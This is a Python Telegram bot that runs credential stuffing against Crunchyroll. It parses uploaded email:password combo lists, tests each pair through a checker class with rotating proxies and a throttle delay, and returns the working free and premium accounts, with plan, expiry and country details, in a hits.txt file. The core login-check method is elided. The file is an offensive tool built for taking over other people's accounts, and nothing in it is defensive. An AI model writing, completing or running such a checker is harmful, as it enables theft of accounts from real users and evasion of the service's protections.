#!/usr/bin/env python3
import os
import asyncio
import uuid
import random
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram import F
from aiogram.types import FSInputFile

BOT_TOKEN = os.getenv("BOT_TOKEN")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

checker = None
proxies = []
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}

RATE_DELAY = 1.8

class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.proxy_index = 0
        self.countries = { ... }  # Your full countries dict (keep as is)

    # ... (your full check method remains unchanged)

async def send_result(chat_id, result):
    if result['status'] not in ['PREMIUM', 'FREE']:
        return

    capture = f"""
{'='*70}
EMAIL: {result['email']}
PASSWORD: {result['password']}
STATUS: {result['status']}
EMAIL VERIFIED: {result.get('email_verified', 'N/A')}
ACCOUNT CREATION: {result.get('account_creation_date', 'N/A')}
PLAN: {result.get('plan', 'N/A')}
CURRENCY: {result.get('currency', 'N/A')}
SUBSCRIBABLE: {result.get('subscribable', 'N/A')}
FREE TRIAL: {result.get('free_trial', 'N/A')}
EXPIRY: {result.get('expiry', 'N/A')}
PLAN DURATION: {result.get('plan_duration', 'N/A')}
ACTIVE: {result.get('active', 'N/A')}
COUNTRY: {result.get('country', 'N/A')}
CHECKED BY: @Sudhakaran12
{'='*70}
"""

    with open("hits.txt", "a", encoding="utf-8") as f:
        f.write(capture + "\n")


@dp.message(F.document | F.text)
async def handle(message: types.Message):
    global checker

    # Proxy loading (unchanged)
    if message.text and message.text.startswith("/proxies"):
        if message.document:
            file = await bot.get_file(message.document.file_id)
            content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
        else:
            content = message.text.replace("/proxies", "").strip()
        global proxies
        proxies = [line.strip() for line in content.splitlines() if line.strip() and ":" in line]
        checker.proxies = proxies
        return await message.answer(f"✅ Loaded {len(proxies)} proxies!")

    # Get combos
    if message.document:
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
    else:
        content = message.text

    lines = []
    for raw in content.splitlines():
        raw = raw.strip()
        if not raw or ':' not in raw:
            continue
        if '@' in raw:
            part = raw.split(':', 1)
            if len(part) == 2 and '@' in part[0]:
                email = part[0].strip()
                password = part[1].split()[0].strip()
                lines.append(email + ":" + password)

    if not lines:
        return await message.answer("No valid email:password found.")

    # Clear old results
    open("hits.txt", "w").close()

    checker = CrunchyrollChecker(proxies)

    await message.answer(f"✅ Found {len(lines)} accounts. Starting check...")

    for i, line in enumerate(lines, 1):
        email, password = line.split(":", 1)
        await message.answer(f"[{i}/{len(lines)}] Checking → {email}")

        result = checker.check(email.strip(), password.strip())

        stats['checked'] += 1
        if result['status'] == 'PREMIUM':
            stats['premium'] += 1
        elif result['status'] == 'FREE':
            stats['free'] += 1
        else:
            stats['invalid'] += 1

        await send_result(message.from_user.id, result)

        await asyncio.sleep(RATE_DELAY)

    # Send hits.txt
    if os.path.exists("hits.txt") and os.path.getsize("hits.txt") > 0:
        await message.answer_document(FSInputFile("hits.txt"), caption="✅ Here are all FREE + PREMIUM accounts with full details")
    else:
        await message.answer("No FREE or PREMIUM accounts found in this file.")


async def main():
    global checker
    checker = CrunchyrollChecker(proxies)
    print("✅ Bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
